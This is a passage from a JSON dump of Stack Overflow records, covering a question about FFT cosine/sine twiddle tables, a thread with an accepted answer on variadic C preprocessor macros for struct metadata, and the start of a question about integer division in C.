0.689541    IM = -0.724247 \nRE = 0.671559    IM = -0.740951 \nRE = 0.653173    IM = -0.757209 \nRE = 0.634393    IM = -0.773010 \nRE = 0.615232    IM = -0.788346 \nRE = 0.595699    IM = -0.803208 \nRE = 0.575808    IM = -0.817585 \nRE = 0.555570    IM = -0.831470 \nRE = 0.534998    IM = -0.844854 \nRE = 0.514103    IM = -0.857729 \nRE = 0.492898    IM = -0.870087 \nRE = 0.471397    IM = -0.881921 \nRE = 0.449611    IM = -0.893224 \nRE = 0.427555    IM = -0.903989 \nRE = 0.405241    IM = -0.914210 \nRE = 0.382683    IM = -0.923880 \nRE = 0.359895    IM = -0.932993 \nRE = 0.336890    IM = -0.941544 \nRE = 0.313682    IM = -0.949528 \nRE = 0.290285    IM = -0.956940 \nRE = 0.266713    IM = -0.963776 \nRE = 0.242980    IM = -0.970031 \nRE = 0.219101    IM = -0.975702 \nRE = 0.195090    IM = -0.980785 \nRE = 0.170962    IM = -0.985278 \nRE = 0.146730    IM = -0.989177 \nRE = 0.122411    IM = -0.992480 \nRE = 0.098017    IM = -0.995185 \nRE = 0.073565    IM = -0.997290 \nRE = 0.049068    IM = -0.998795 \nRE = 0.024541    IM = -0.999699 \n</code></pre>\n\n<p>And this is only a minimal exaple that I can explain you as much as possibble.</p>\n\n<p>What i want and tried to create is a table that begins with the earlier set of lines and the resdt will be as following:</p>\n\n<p><strong>(earlier set of lines)</strong> expressed as following(idx:0 --- > 64)</p>\n\n<pre><code>    re[idx] = (float) cos((float)i * (2*pi)/(float)N);\n    im[idx] = (float)-sin((float)i * (2*pi)/(float)N);\n</code></pre>\n\n<p><strong>(2nd set of lines)</strong> expressed as following repeated 4 times consequently</p>\n\n<pre><code>    re[idx] = (float) cos(4 * (float)i * (2*pi)/(float)N);\n    im[idx] = (float)-sin(4 * (float)i * (2*pi)/(float)N);\n</code></pre>\n\n<p><strong>(3nd set of lines)</strong> expressed as following repeated 16 times consequently</p>\n\n<pre><code>    re[idx] = (float) cos(16 * (float)i * (2*pi)/(float)N);\n    im[idx] = (float)-sin(16 * (float)i * (2*pi)/(float)N);\n</code></pre>\n\n<p>The result is expected to be as following:</p>\n\n<pre><code>//set 1 as above  repeated just 1 time\n// ....\n//set 2 repeated 4 times\nRE = 1.000000    IM = -0.000000 //1st ligne of set 1\nRE = 0.995185    IM = -0.098017 //4th ligne of set 1\nRE = 0.980785    IM = -0.195090 //8th ligne of set 1\nRE = 0.956940    IM = -0.290285 //12th ligne of set 1 ...\nRE = 0.923880    IM = -0.382683 \nRE = 0.881921    IM = -0.471397 \nRE = 0.831470    IM = -0.555570 \nRE = 0.773010    IM = -0.634393 \nRE = 0.707107    IM = -0.707107 \nRE = 0.634393    IM = -0.773010 \nRE = 0.555570    IM = -0.831470 \nRE = 0.471397    IM = -0.881921 \nRE = 0.382683    IM = -0.923880 \nRE = 0.290285    IM = -0.956940 \nRE = 0.195090    IM = -0.980785 \nRE = 0.098017    IM = -0.995185\n// set 3 repeated 16 times\nRE = 1.000000    IM = -0.000000 //1st ligne of set 1\nRE = 0.923880    IM = -0.382683 //16th ligne of set 1\nRE = 0.707107    IM = -0.707107 //38th ligne of set 1\nRE = 0.382683    IM = -0.923880 //64th ligne of set 1\n</code></pre>\n\n<p>I've tried several times but i keep getting wrong results I don't know if it's precison issue or sometimng else.</p>\n"}, {"tags": ["c", "c-preprocessor", "preprocessor-directive"], "comments": [{"owner": {"reputation": 64283, "user_id": 315052, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/AB5ST.png?s=128&g=1", "display_name": "jxh", "link": "https://stackoverflow.com/users/315052/jxh"}, "edited": false, "score": 0, "creation_date": 1499184776, "post_id": 44910376, "comment_id": 76797423, "body": "Have a look at <a href=\"http://p99.gforge.inria.fr/p99-html/\" rel=\"nofollow noreferrer\">p99.gforge.inria.fr/p99-html</a>"}, {"owner": {"reputation": 11533, "user_id": 1366431, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/YBopF.png?s=128&g=1", "display_name": "Leushenko", "link": "https://stackoverflow.com/users/1366431/leushenko"}, "edited": false, "score": 0, "creation_date": 1499184777, "post_id": 44910376, "comment_id": 76797425, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/31654930/c-variadic-macro-which-expands-into-set-of-macro-calls-on-each-argument\">C - Variadic macro which expands into set of macro calls on each argument</a>"}, {"owner": {"reputation": 2336, "user_id": 3936002, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/utGjG.png?s=128&g=1", "display_name": "H Walters", "link": "https://stackoverflow.com/users/3936002/h-walters"}, "edited": false, "score": 0, "creation_date": 1499190903, "post_id": 44910376, "comment_id": 76799954, "body": "Must it look like <code>META_STRUCT(example, META_FIELD(i), META_FIELD(d))</code>?  Could it look instead like <code>META_STRUCT(example, i, d)</code> or <code>META_STRUCT(example, (i, d))</code>?"}, {"owner": {"reputation": 85, "user_id": 1832501, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c1af31e3c6e2b749f2822c0c9a63ea04?s=128&d=identicon&r=PG", "display_name": "blacklion", "link": "https://stackoverflow.com/users/1832501/blacklion"}, "reply_to_user": {"reputation": 2336, "user_id": 3936002, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/utGjG.png?s=128&g=1", "display_name": "H Walters", "link": "https://stackoverflow.com/users/3936002/h-walters"}, "edited": false, "score": 0, "creation_date": 1499191233, "post_id": 44910376, "comment_id": 76800070, "body": "@h-walters Here is simplified example, as I mentioned. In reality META_FILED have several arguments (6 of them) and here are helper macros for defaulting some of arguments like <code>META_FIELD_INT8(name)</code>, <code>META_FIELD_STRING()</code>, etc. It maps badly to simple list of names."}, {"owner": {"reputation": 2336, "user_id": 3936002, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/utGjG.png?s=128&g=1", "display_name": "H Walters", "link": "https://stackoverflow.com/users/3936002/h-walters"}, "edited": false, "score": 0, "creation_date": 1499193786, "post_id": 44910376, "comment_id": 76801134, "body": "Certainly nested <code>META_STRUCT</code> macros cannot be the same, since they should be expanding to something different?  (I wouldn&#39;t expect to see <code>static struct meta_struct s_meta_##NAME ={</code> in the middle of an initializer)."}, {"owner": {"reputation": 85, "user_id": 1832501, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c1af31e3c6e2b749f2822c0c9a63ea04?s=128&d=identicon&r=PG", "display_name": "blacklion", "link": "https://stackoverflow.com/users/1832501/blacklion"}, "edited": false, "score": 0, "creation_date": 1499193945, "post_id": 44910376, "comment_id": 76801208, "body": "Yes, certainly I need <code>META_STRUCT()</code> for top-level (defining static named object) and <code>META_SUBSTRUCT()</code> for all nesting levels (defining compound literal), but <code>META_SUBSTRUCT()</code>s could be nested for several layers deep! I&#39;ve updated question again to show whan I want achive with nesting example."}, {"owner": {"reputation": 2336, "user_id": 3936002, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/utGjG.png?s=128&g=1", "display_name": "H Walters", "link": "https://stackoverflow.com/users/3936002/h-walters"}, "edited": false, "score": 0, "creation_date": 1499194122, "post_id": 44910376, "comment_id": 76801282, "body": "It&#39;d help if you can sketch out your usage model to the point of the nested <code>META_SUBSTRUCT</code>, including what use that field would have when not nesting.  FYI, the solution for this seems to be a non-trivial CPP metaprogram, and this particular detail seems important for a scalable solution."}, {"owner": {"reputation": 85, "user_id": 1832501, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c1af31e3c6e2b749f2822c0c9a63ea04?s=128&d=identicon&r=PG", "display_name": "blacklion", "link": "https://stackoverflow.com/users/1832501/blacklion"}, "reply_to_user": {"reputation": 2336, "user_id": 3936002, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/utGjG.png?s=128&g=1", "display_name": "H Walters", "link": "https://stackoverflow.com/users/3936002/h-walters"}, "edited": false, "score": 0, "creation_date": 1499194462, "post_id": 44910376, "comment_id": 76801412, "body": "@h-walters I&#39;ve added example of desired input and output to my question. It has only one level of nesting, but it is obvious how to exapnd it to next level.My main problem is to distribute name of struct in question (<code>parent</code> and <code>child</code> in my example) to all field definitions (<code>offsetoff()</code> &quot;calls&quot;) without typing name of parent struct in each user-facing <code>META_FIELD()</code> macro call."}, {"owner": {"reputation": 398, "user_id": 5871187, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hu64h.jpg?s=128&g=1", "display_name": "S Dao", "link": "https://stackoverflow.com/users/5871187/s-dao"}, "edited": false, "score": 0, "creation_date": 1499228426, "post_id": 44910376, "comment_id": 76809882, "body": "@blacklion you are going too far! This requirement could lead to creating your own preprocessor because dealing with nested structure could lead to too many issues"}], "answers": [{"comments": [{"owner": {"reputation": 85, "user_id": 1832501, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c1af31e3c6e2b749f2822c0c9a63ea04?s=128&d=identicon&r=PG", "display_name": "blacklion", "link": "https://stackoverflow.com/users/1832501/blacklion"}, "edited": false, "score": 0, "creation_date": 1499195899, "post_id": 44912650, "comment_id": 76801986, "body": "First of all,  ##__VA_ARGS__ is gcc extension, as far as I know. It is not portable. And, second, it is simple with only one parameter (name) per field. If you add second one, third one, etc \u2014 this simple solution doesn&#39;t work anymore or becomes ugly (parameters of fields goes in one list of arguments)."}], "tags": [], "owner": {"reputation": 398, "user_id": 5871187, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hu64h.jpg?s=128&g=1", "display_name": "S Dao", "link": "https://stackoverflow.com/users/5871187/s-dao"}, "is_accepted": false, "score": 0, "last_activity_date": 1499194965, "creation_date": 1499194965, "answer_id": 44912650, "question_id": 44910376, "link": "https://stackoverflow.com/questions/44910376/write-vargarg-c-preprocessor-macro-which-calls-some-other-macro-with-each-of-its/44912650#44912650", "title": "Write vargarg C preprocessor macro which calls some other macro with each of its arguments and more", "body": "<p>How about using <code>__VA_ARGS__</code>? Codesnip below accepts maximize 4 fields but you can expands to 5, 6 or more by copy and paste some line of codes (refer <a href=\"https://stackoverflow.com/questions/31654930/c-variadic-macro-which-expands-into-set-of-macro-calls-on-each-argument\">here</a> for more detail).</p>\n\n<p>Header file:</p>\n\n<pre><code>#define META_FIELD1(st,x1) { .name = #x1, .offset = offsetof(struct st, x1) }\n#define META_FIELD2(st,x1,x2) META_FIELD1(st,x1), META_FIELD1(st, x2)\n#define META_FIELD3(st,x1,x2,x3) META_FIELD1(st,x1), META_FIELD2(st,x2,x3)\n#define META_FIELD4(st,x1,x2,x3,x4) META_FIELD1(st,x1), META_FIELD3(st,x2,x3,x4)\n#define META_FIELD(st, ...)     META_FIELD4(st, ##__VA_ARGS__) // limit to 4\n\n#define META_STRUCT(st, ...) \\\n    static struct meta_struct meta_struct_##st = { \\\n        .name = #st, \\\n        .size = sizeof(struct st), \\\n        .fields = { \\\n            META_FIELD(st, ##__VA_ARGS__) \\\n        } \\\n    } \\\n</code></pre>\n\n<p>C file:</p>\n\n<pre><code>struct sample {\n    int i;\n    double d;\n    const char *test;\n    float t;\n};\n\nMETA_STRUCT(sample, i, d, test, t);\n\n/*\n * \n */\nint main(int argc, char** argv) {\n    printf(\"struct %s { %s, %s, %s, %s } \\n\", \n            meta_struct_sample.name, \n            meta_struct_sample.fields[0].name, \n            meta_struct_sample.fields[1].name, \n            meta_struct_sample.fields[2].name, \n            meta_struct_sample.fields[3].name);\n\n    return (EXIT_SUCCESS);\n}\n</code></pre>\n\n<p>Output should be: <code>struct sample { i, i, test, t }</code></p>\n"}, {"comments": [{"owner": {"reputation": 85, "user_id": 1832501, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c1af31e3c6e2b749f2822c0c9a63ea04?s=128&d=identicon&r=PG", "display_name": "blacklion", "link": "https://stackoverflow.com/users/1832501/blacklion"}, "edited": false, "score": 0, "creation_date": 1499273872, "post_id": 44914654, "comment_id": 76839915, "body": "Thank you! It works, and I understand how it works, which is very important for me!"}], "tags": [], "owner": {"reputation": 2336, "user_id": 3936002, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/utGjG.png?s=128&g=1", "display_name": "H Walters", "link": "https://stackoverflow.com/users/3936002/h-walters"}, "is_accepted": true, "score": 1, "last_activity_date": 1499208237, "last_edit_date": 1499208237, "creation_date": 1499206845, "answer_id": 44914654, "question_id": 44910376, "link": "https://stackoverflow.com/questions/44910376/write-vargarg-c-preprocessor-macro-which-calls-some-other-macro-with-each-of-its/44914654#44914654", "title": "Write vargarg C preprocessor macro which calls some other macro with each of its arguments and more", "body": "<p>Here's an approach.</p>\n\n<h2>Basic utilities</h2>\n\n<pre><code>#define GLUE(A,B) GLUE_I(A,B)\n#define GLUE_I(A,B) A##B\n#define COUNT(...) COUNT_I(__VA_ARGS__, 9, 8, 7, 6, 5, 4, 3, 2, 1,)\n#define COUNT_I(V,_9,_8,_7,_6,_5,_4,_3,_2,X,...) X\n</code></pre>\n\n<p>This is an indirect glue macro (allowing arguments to expand) and a count macro.  The count macro here supports only 9 arguments, but it's easy to expand the pattern.  This just expands to the number of arguments passed.  I'm assuming you've seen this before, but just in case you haven't, this just works by argument shifting; it indirectly expands the arguments, and each extra argument shift above 1 displaces the number list until something is \"above\" X, which it expands to.</p>\n\n<pre><code>#define FIRST(...) FIRST_I(__VA_ARGS__,)\n#define FIRST_I(X,...) X\n#define REST(X,...) __VA_ARGS__\n#define EXPAND(...) __VA_ARGS__\n</code></pre>\n\n<p>...these are operations on tuples.  For the purposes of this answer, a <em>tuple</em> is a set of tokens in parentheses.  <code>FIRST</code> and <code>REST</code> use tuples as data types (should be obvious; <code>FIRST</code> indirectly grabs the first element, <code>REST</code> expands to everything but that).  <code>EXPAND</code> unwraps a tuple.</p>\n\n<p>And the next utility macro:</p>\n\n<pre><code>#define FOREACH(MACRO_,DATA_,TUPLE_) GLUE(FOREACH_I_,COUNT TUPLE_)(MACRO_,DATA_,TUPLE_)\n\n#define FOREACH_I_1(MACRO_,DATA_,TUPLE_) MACRO_(DATA_,FIRST TUPLE_)\n#define FOREACH_I_2(MACRO_,DATA_,TUPLE_) MACRO_(DATA_,FIRST TUPLE_) FOREACH_I_1(MACRO_,DATA_,(REST TUPLE_))\n#define FOREACH_I_3(MACRO_,DATA_,TUPLE_) MACRO_(DATA_,FIRST TUPLE_) FOREACH_I_2(MACRO_,DATA_,(REST TUPLE_))\n#define FOREACH_I_4(MACRO_,DATA_,TUPLE_) MACRO_(DATA_,FIRST TUPLE_) FOREACH_I_3(MACRO_,DATA_,(REST TUPLE_))\n#define FOREACH_I_5(MACRO_,DATA_,TUPLE_) MACRO_(DATA_,FIRST TUPLE_) FOREACH_I_4(MACRO_,DATA_,(REST TUPLE_))\n#define FOREACH_I_6(MACRO_,DATA_,TUPLE_) MACRO_(DATA_,FIRST TUPLE_) FOREACH_I_5(MACRO_,DATA_,(REST TUPLE_))\n#define FOREACH_I_7(MACRO_,DATA_,TUPLE_) MACRO_(DATA_,FIRST TUPLE_) FOREACH_I_6(MACRO_,DATA_,(REST TUPLE_))\n#define FOREACH_I_8(MACRO_,DATA_,TUPLE_) MACRO_(DATA_,FIRST TUPLE_) FOREACH_I_7(MACRO_,DATA_,(REST TUPLE_))\n#define FOREACH_I_9(MACRO_,DATA_,TUPLE_) MACRO_(DATA_,FIRST TUPLE_) FOREACH_I_8(MACRO_,DATA_,(REST TUPLE_))\n</code></pre>\n\n<p>This is the key macro; it is in practice used to apply your structure's type into the lower level macros for each field.  Again, this particular code only works with 9 fields per level, but it should be obvious how to extend this (you probably want to support as many levels as your <code>COUNT</code> macro can count to).</p>\n\n<p>The third argument of <code>FOREACH</code> should be a tuple; <code>FOREACH</code>'s job is to call your macro on <code>DATA_</code> and each element of <code>TUPLE_</code>.  For example, <code>FOREACH(FIELD,parent,(i,j,k))</code> expands to <code>FIELD(parent,i) FIELD(parent,j) FIELD(parent,k)</code>.</p>\n\n<h2>Concept for specific utilities</h2>\n\n<p>The core calling structure for the specific utilities uses tuple data types; when used with the <code>FOREACH</code> macro, underlying calls will curry the outer structure type into each call appropriately.  The calling structure looks like this:</p>\n\n<p><code><b>META_STRUCT(</b>type <b>,</b> FIELD[ <b>,</b> FIELD[ ... ] ] <b>)</b></code></p>\n\n<p>...where each <code>FIELD</code> is a 3-tuple:</p>\n\n<p><code><b>(</b>name <b>,</b> type <b>,</b> CHILD <b>)</b></code></p>\n\n<p>...and each <code>CHILD</code> is a tuple, which is expanded into a <code>.child</code> assignment.  <code>META_SUBSTRUCT</code> works similarly.  So according to this call structure, your example will actually wind up being called like this:</p>\n\n<p><code>META_STRUCT(parent, (i, mt_int, (NULL)), (c, mt_struct, META_SUBSTRUCT(child,(i,mt_int,(NULL)))),(s, mt_string, (NULL)));</code></p>\n\n<p>In practice, <code>META_SUBSTRUCT</code> will actually fully expand.  Its expansion will be a \"tuple of tokens\" that acts as the child assignment; that is, <code>META_SUBSTRUCT</code> will expand to the actual assignments in the substruct surrounded by parentheses.  The <code>FOREACH</code> macro is applied to this construct, currying the outer structure and the three arguments of the above 3-tuple into the 4-argument macro <code>APPLY_UTILI_FIELD</code>.</p>\n\n<p>The <em>usage</em> mirrors your usage and adopts to this call structure.  For example, <code>META_FIELD(i, mt_int)</code> is just a macro that expands to <code>(i, mt_int, (NULL))</code>.</p>\n\n<h2>Specific utilities</h2>\n\n<pre><code>#define META_STRUCT_BEGIN(NAME_) \\\n   static struct meta_struct s_meta_##NAME_ = {  \\\n      .name = #NAME_,  \\\n      .size = sizeof(struct NAME_),  \\\n      .fields = (struct meta_field[]) { \n\n#define META_STRUCT(NAME_,...) \\\n   META_STRUCT_BEGIN(NAME_) \\\n      FOREACH(APPLY_META_STRUCT_MACRO,NAME_,(__VA_ARGS__)) \\\n   META_STRUCT_END()\n\n#define META_STRUCT_END()  \\\n         {NULL, mt_end, 0, NULL}}}\n\n#define META_SUBSTRUCT(NAME_,...) \\\n   ( META_SUBSTRUCT_BEGIN(NAME_) \\\n        FOREACH(APPLY_META_STRUCT_MACRO,NAME_,(__VA_ARGS__)) \\\n     META_SUBSTRUCT_END() )\n\n#define META_SUBSTRUCT_BEGIN(NAME_) \\\n   &amp;(struct meta_struct) { \\\n      .name = #NAME_, \\\n      .size = sizeof(struct NAME_), \\\n      .fields = (struct meta_field[]) {\n\n#define META_SUBSTRUCT_END() \\\n    {NULL, mt_end, 0, NULL}}}\n\n#define APPLY_META_STRUCT_MACRO(DATA_, ARG_) APPLY_UTIL_FIELD(DATA_, EXPAND ARG_)\n#define APPLY_UTIL_FIELD(...) APPLY_UTILI_FIELD(__VA_ARGS__)\n#define APPLY_UTILI_FIELD( STRUCT_, FIELD_, TYPE_, CHILD_) \\\n   { .name = #FIELD_, .type = TYPE_, .offset = offsetof(struct STRUCT_, FIELD_), .child = EXPAND CHILD_ },\n\n#define META_FIELD(NAME_, TYPE_) (NAME_, TYPE_, (NULL))\n#define META_FIELD_SUB(NAME_, SUB_) (NAME_, mt_struct, SUB_)\n</code></pre>\n\n<h2>Demo</h2>\n\n<p><a href=\"https://godbolt.org/g/oKYDMm\" rel=\"nofollow noreferrer\">Showing your example</a></p>\n\n<h2>Notes</h2>\n\n<h3>Nesting</h3>\n\n<p>These macros allow nesting indefinitely of <code>META_SUBSTRUCT</code> calls without running into blue paint, since all such macros wind up being evaluated in the argument substitution phase (<code>...</code> argument mentioning <code>__VA_ARGS__</code> causes all arguments to expand; each level of <code>META_SUBSTRUCT</code> is a top level expansion in this scenario; this condition recurses).</p>\n\n<h3>Your six fields</h3>\n\n<p>Given you're showing an example with less fields than you're using, you need specifically to tweak your user defined <code>META_FIELD</code>, <code>META_FIELD_SUB</code>, etc macros to produce <code>k</code>-tuples instead of 3-tuples (where <code>k</code> is what you need).  Then, just adjust <code>APPLY_UTILI_FIELD</code>'s arguments and expansion to match.</p>\n\n<h3>Microsoft Compatibility</h3>\n\n<p>This code assumes a standard C preprocessor.  If you're working on MSVC specifically (which doesn't have one), it won't work.  Specifically, MSVC fails to expand <code>__VA_ARGS__</code> when it's supposed to; if you <em>care</em> to work on MSVC, change the corresponding macros for these three to:</p>\n\n<pre><code>#define COUNT(...) EXPAND(COUNT_I(__VA_ARGS__, 9, 8, 7, 6, 5, 4, 3, 2, 1,))\n#define FIRST(...) EXPAND(FIRST_I(__VA_ARGS__,))\n#define APPLY_UTIL_FIELD(...) EXPAND(APPLY_UTILI_FIELD(__VA_ARGS__))\n</code></pre>\n\n<p>The result should also work on standard compliant CPP's.</p>\n"}], "owner": {"reputation": 85, "user_id": 1832501, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c1af31e3c6e2b749f2822c0c9a63ea04?s=128&d=identicon&r=PG", "display_name": "blacklion", "link": "https://stackoverflow.com/users/1832501/blacklion"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 225, "favorite_count": 1, "accepted_answer_id": 44914654, "answer_count": 2, "score": 0, "last_activity_date": 1499208237, "creation_date": 1499184584, "last_edit_date": 1499194272, "question_id": 44910376, "link": "https://stackoverflow.com/questions/44910376/write-vargarg-c-preprocessor-macro-which-calls-some-other-macro-with-each-of-its", "title": "Write vargarg C preprocessor macro which calls some other macro with each of its arguments and more", "body": "<p>I need to have meta-information about structures in my code. So, I've code some combination of C structures (to store meta information) and C preprocessor macros to initialize these structures without much of boilerplate code. Now it looks like this (really, I'm storing a lot more information about fields, but this code is enough for my question):</p>\n\n<pre><code>#include &lt;stdint.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stddef.h&gt;\n\nstruct meta_field {\n  const char *name;\n  size_t offset;\n};\n\nstruct meta_struct {\n  const char *name;\n  size_t size;\n  struct meta_field fields[];\n};\n\n#define META_STRUCT_BEGIN(NAME)               \\\n  static struct meta_struct s_meta_##NAME = { \\\n    .name = \"\" #NAME,                         \\\n    .size = sizeof(struct NAME),              \\\n    .fields = {\n#define META_STRUCT_END()  ,{NULL, 0}}}\n#define META_FIELD(NAME)   { .name = \"\" #NAME, .offset = offsetof(struct CURRENT_META_STRUCT, NAME) }\n\n\nstruct example {\n  int i;\n  double d;\n};\n\n#define CURRENT_META_STRUCT example\nMETA_STRUCT_BEGIN(CURRENT_META_STRUCT)\n  META_FIELD(i),\n  META_FIELD(d)\nMETA_STRUCT_END();\n#undef CURRENT_META_STRUCT\n</code></pre>\n\n<p>It works. But it has a lot of boilerplate still: <code>#define CURRENT_META_STRUCT</code>, usage of <code>CURRENT_META_STRUCT</code> as argument to <code>META_STRUCT_BEGIN()</code>, <code>#undef</code> for <code>CURRENT_META_STRUCT</code> \u2014 all of this looks ugly, IMHO.</p>\n\n<p>I know, that it is impossible to define macro by macro (so, <code>META_STRUCT_BEGIN()</code> can not define <code>CURRENT_META_STRUCT</code>). But looking at Branf*ck implementation in C Preprocessor and Boost-PP, I think that it is posisble to implement something which will look like this:</p>\n\n<pre><code>META_STRUCT(example,\n  META_FIELD(i),\n  META_FIELD(d)\n)\n</code></pre>\n\n<p>But I can not wrap my head around this preprocessor magic.</p>\n\n<p>Could somebody helps me?</p>\n\n<p>I've read <a href=\"https://github.com/orangeduck/CPP_COMPLETE\" rel=\"nofollow noreferrer\">https://github.com/orangeduck/CPP_COMPLETE</a> already, but it didn't help.</p>\n\n<p>Also, it was marked as duplicate of <a href=\"https://stackoverflow.com/questions/31654930/c-variadic-macro-which-expands-into-set-of-macro-calls-on-each-argument\">this</a>, but problem is I need to add \"default\" argument to all generated macro \"calls\".</p>\n\n<p>Here are some sketch, what I want to achieve:</p>\n\n<pre><code>#define META_FIELD_IMPL(STRUCT, NAME) { .name = \"\" #NAME, .offset = offsetof(struct STRUCT, NAME) }\n\n#define META_FIELD(NAME)  NAME\n\n#define META_STRUCT(NAME, ... )               \\\n  static struct meta_struct s_meta_##NAME = { \\\n    .name = \"\" #NAME,                         \\\n    .size = sizeof(struct NAME),              \\\n    .fields = {                               \\\n      /* Each ARG from __VA_ARGS__ is META_FIELD(x) and                 \\\n       * I need to call META_FIELD_IMPL(NAME, &lt;Expansion of META_FIELD&gt;) \\\n       * for each ARG from _VA_ARGS_ here */                            \\\n      {NULL, 0}                               \\\n     }}\n</code></pre>\n\n<p>Now in this example there is only one argument for <code>META_FIELD()</code>: <code>NAME</code>, but in real system there are 6 arguments for <code>META_FIELD()</code> and some helper macro which provide \"default\" values for common cases, so <code>META_FIELD()</code> is necessary and could not be replaced by <code>NAME</code> itself.</p>\n\n<p>And one last complication: such <code>META_STRUCT()</code> could be called as argument to <code>META_FIELD()</code>, because some fields contains pointers to nested meta-structs! Now it is done by declaring named objects for all nested sub-structures, but I want to avoid it too! I understand, that depth of nesting could be limited by some arbitrary constant, it is Ok.</p>\n\n<p><strong>Update</strong>: I added this example of what I want to type and what I want to get after preprocessor. I can not figure out how to implement all these macros (marked with <code>/* ??? */</code>). And, yes, I've checked, manually-coded \"end result\" compiles fine.</p>\n\n<pre><code>enum meta_type { mt_end, mt_int, mt_string, mt_struct };\n\nstruct meta_struct;\n\nstruct meta_field {\n  const char *name;\n  enum meta_type type;\n  size_t offset;\n  struct meta_struct *child;\n};\n\nstruct meta_struct {\n  const char *name;\n  size_t size;\n  struct meta_field *fields;\n};\n\n#define META_STRUCT(NAME, ...)  static struct meta_struct s_meta_##name = { .name = #NAME, .size = sizeof(struct NAME), .fileds = (struct meta_field[]){ /* ??? */, {NULL, mt_end, 0, NULL}}}\n#define META_FIELD_IMPL0(STRUCT, NAME, TYPE, CHILD) { .name = #NAME, .type = TYPE, .offset = offsetof(STRUCT, NAME), .child = CHILD }\n#define META_FIELD_IMPL1(NAME, TYPE, CHILD)  /* ??? */\n\n#define META_FIELD(NAME, TYPE)       META_FIELD_IMPL1(NAME, TYPE, NULL)\n#define META_FIELD_SUB(NAME, CHILD)  META_FIELD_IMPL1(NAME, mt_struct, CHILD)\n#define META_SUBSTRUCT(NAME, ...)  (struct meta_struct){ .name = #NAME, .size = sizeof(struct NAME), .fileds = (struct meta_field[]){ /* ??? */, {NULL, mt_end, 0, NULL}}}\n\n/* Example of \"input\": */\nstruct child {\n  int i;\n};\n\nstruct parent {\n  int i;\n  struct child c;\n  const char *s;\n};\n\nMETA_STRUCT(parent,\n  META_FIELD(i, mt_int),\n  META_FIELD_SUB(c, \n    META_SUBSTRUCT(child,\n      META_FIELD(i, mt_int)\n    )\n  ),\n  META_FIELD(s, mt_string)\n);\n\n/* This should give this */\nstatic struct meta_struct s_meta_parent = {\n  .name = \"parent\",\n  .size = sizeof(struct parent),\n  .fields = (struct meta_field[]) {\n    { .name = \"i\", .type = mt_int, .offset = offsetof(struct parent, i), .child = NULL },\n    { .name = \"c\", .type = mt_struct, .offset = offsetof(struct parent, c), .child = &amp;(struct meta_struct){\n        .name = \"child\",\n        .size = sizeof(struct child),\n        .fields = (struct meta_field[]) {\n          { .name = \"i\", .type = mt_int, .offset = offsetof(struct child, i), .child = NULL },\n          {NULL, mt_end, 0, NULL}\n        }\n      }\n    },\n    { .name = \"s\", .type = mt_string, .offset = offsetof(struct parent, s), .child = NULL },\n    {NULL, mt_end, 0, NULL}\n  }\n};\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1499183632, "post_id": 44910085, "comment_id": 76796793, "body": "Solving what? You have just dumped some code here. How are we supposed to know what it does?"}, {"owner": {"reputation": 1595, "user_id": 6638533, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/Qy9JV.jpg?s=128&g=1", "display_name": "samAlvin", "link": "https://stackoverflow.com/users/6638533/samalvin"}, "edited": false, "score": 3, "creation_date": 1499183754, "post_id": 44910085, "comment_id": 76796865, "body": "I think you need to be more concrete on what &quot;it doesn&#39;t work&quot; means."}, {"owner": {"reputation": 38136, "user_id": 971127, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6289285bbe25ce36ef68fe4932256350?s=128&d=identicon&r=PG&f=1", "display_name": "BLUEPIXY", "link": "https://stackoverflow.com/users/971127/bluepixy"}, "edited": false, "score": 2, "creation_date": 1499184031, "post_id": 44910085, "comment_id": 76797009, "body": "Try <code>sum = sum &#47; m;     printf(&quot;The average of the i-th line is %d e&#39;: %d\\n&quot;, i, sum);</code> --&gt; <code>printf(&quot;The average of the i-th line is %d e&#39;: %.2f\\n&quot;, i, (double)sum&#47;m);</code>"}, {"owner": {"reputation": 9, "user_id": 8232558, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e5d8c81f952d1da6db063de6f126122?s=128&d=identicon&r=PG&f=1", "display_name": "Pietro Dimichele", "link": "https://stackoverflow.com/users/8232558/pietro-dimichele"}, "edited": false, "score": 0, "creation_date": 1499184278, "post_id": 44910085, "comment_id": 76797160, "body": "solved, thank you all"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1499209864, "post_id": 44910085, "comment_id": 76806320, "body": "this statement: <code>sum = sum &#47; m;</code> is performing an integer divide.  So any fraction will be lost. suggest 1) <code>sum</code> be declared as <code>double</code> or <code>float</code>.  2) the format specifier in the call to <code>printf()</code> for <code>sum</code> be changed to <code>%.2f</code>"}], "answers": [{"tags": [], "owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": 